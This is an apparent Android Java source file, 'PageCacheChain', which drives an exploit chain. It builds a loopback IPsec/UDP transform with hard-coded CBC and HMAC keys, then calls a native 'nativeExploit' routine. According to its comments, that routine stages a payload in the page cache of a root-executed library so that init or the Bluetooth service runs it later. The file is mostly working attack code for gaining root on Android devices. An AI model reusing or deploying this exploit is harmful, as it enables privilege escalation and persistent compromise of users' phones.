package dev.lanyard.payload;

import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.util.Log;

import java.net.InetAddress;
import java.nio.charset.StandardCharsets;

/**
 * The Open Crown page-cache relay chain, vendored for the Lanyard runner.
 *
 * <p>This is the same IPsec/UDP + CBC page-cache write used by the Open Crown
 * Diagnostics experiment. It stages the payload in a root-executed library's
 * page cache for the current boot. It does not trigger the payload; the init
 * relay activates on the next init LOG(), and the Bluetooth target activates
 * on a live GATT read. Both are outside this app.</p>
 */
public final class PageCacheChain {
    public interface Listener {
        void onLog(String line);
    }

    private static final String TAG = "LanyardPayload";
    private static final int TARGET_INIT = 0;
    private static final int TARGET_BT = 1;
    private static final int HMAC_TRUNC_BITS = 128;
    private static final Object RUN_LOCK = new Object();
    private static final byte[] AES_KEY =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ012345".getBytes(StandardCharsets.US_ASCII);
    private static final byte[] HMAC_KEY =
            "HMACKEY_FOR_DIRTYINIT_CBC_MODE!!".getBytes(StandardCharsets.US_ASCII);

    private final Context context;
    private volatile Listener listener;
    private static volatile boolean nativeLoaded;

    public PageCacheChain(Context context) {
        this.context = context.getApplicationContext();
    }

    private native String nativeExploit(
            int encapPort,
            int spi,
            byte[] payload,
            byte[] keys,
            int hmacTruncBytes,
            int targetMode,
            Object callback);

    private native String nativeProbe();

    /** Load the relay and call a non-writing probe. Never touches a target. */
    public boolean probe(Listener target) {
        if (!loadNative(target)) {
            return false;
        }
        try {
            String result = nativeProbe();
            target.onLog("native relay: " + result);
            return result != null && !result.isEmpty();
        } catch (Throwable error) {
            Log.e(TAG, "native probe failed", error);
            target.onLog("native probe failed: " + error.getMessage());
            return false;
        }
    }

    /** Called from the native relay on the worker thread. */
    public void onNativeProgress(String message) {
        Listener current = listener;
        if (current != null && message != null) {
            current.onLog(message);
        }
    }

    public boolean run(byte[] payload, int targetMode, Listener target) {
        if (targetMode != TARGET_INIT && targetMode != TARGET_BT) {
            target.onLog("unknown target mode: " + targetMode);
            return false;
        }
        if (!loadNative(target)) {
            return false;
        }
        listener = target;
        synchronized (RUN_LOCK) {
            IpSecManager ipsec = null;
            IpSecManager.SecurityParameterIndex spi = null;
            IpSecManager.UdpEncapsulationSocket encapsulation = null;
            IpSecTransform transform = null;
            try {
                if (payload.length < 16 || payload.length % 4 != 0) {
                    target.onLog("payload size " + payload.length + " is invalid");
                    return false;
                }
                ipsec = context.getSystemService(IpSecManager.class);
                if (ipsec == null) {
                    target.onLog("IpSecManager is unavailable");
                    return false;
                }

                InetAddress loopback = InetAddress.getByName("127.0.0.1");
                spi = ipsec.allocateSecurityParameterIndex(loopback);
                IpSecAlgorithm crypt = new IpSecAlgorithm("cbc(aes)", AES_KEY);
                IpSecAlgorithm auth =
                        new IpSecAlgorithm("hmac(sha256)", HMAC_KEY, HMAC_TRUNC_BITS);
                encapsulation = ipsec.openUdpEncapsulationSocket();
                int port = encapsulation.getPort();
                transform = new IpSecTransform.Builder(context)
                        .setEncryption(crypt)
                        .setAuthentication(auth)
                        .setIpv4Encapsulation(encapsulation, port)
                        .buildTransportModeTransform(loopback, spi);

                byte[] keys = new byte[64];
                System.arraycopy(AES_KEY, 0, keys, 0, 32);
                System.arraycopy(HMAC_KEY, 0, keys, 32, 32);

                target.onLog("native relay starting: target="
                        + (targetMode == TARGET_BT ? "bluetooth" : "init")
                        + " payload=" + payload.length + " bytes");
                String result = nativeExploit(
                        port,
                        spi.getSpi(),
                        payload,
                        keys,
                        HMAC_TRUNC_BITS / 8,
                        targetMode,
                        this);
                if (result == null) {
                    target.onLog("native relay returned no result");
                    return false;
                }
                boolean verified = result.contains("Verified:")
                        && result.contains("PAGE CACHE MODIFIED");
                target.onLog(verified
                        ? "Native relay reports a verified page-cache write."
                        : "Native relay did not report a verified page-cache write.");
                return verified;
            } catch (Throwable error) {
                Log.e(TAG, "page-cache chain failed", error);
                target.onLog("chain failed: "
                        + error.getClass().getSimpleName()
                        + ": "
                        + error.getMessage());
                return false;
            } finally {
                closeQuietly(transform);
                closeQuietly(encapsulation);
                closeQuietly(spi);
                listener = null;
            }
        }
    }

    private boolean loadNative(Listener target) {
        if (nativeLoaded) {
            return true;
        }
        synchronized (RUN_LOCK) {
            if (nativeLoaded) {
                return true;
            }
            try {
                System.loadLibrary("pagecache_relay");
                nativeLoaded = true;
                return true;
            } catch (Throwable error) {
                Log.e(TAG, "native relay load failed", error);
                target.onLog("native relay is unavailable: " + error.getMessage());
                return false;
            }
        }
    }

    private static void closeQuietly(AutoCloseable closeable) {
        if (closeable == null) {
            return;
        }
        try {
            closeable.close();
        } catch (Exception ignored) {
            // The transform may already be gone; the payload result stands.
        }
    }
}
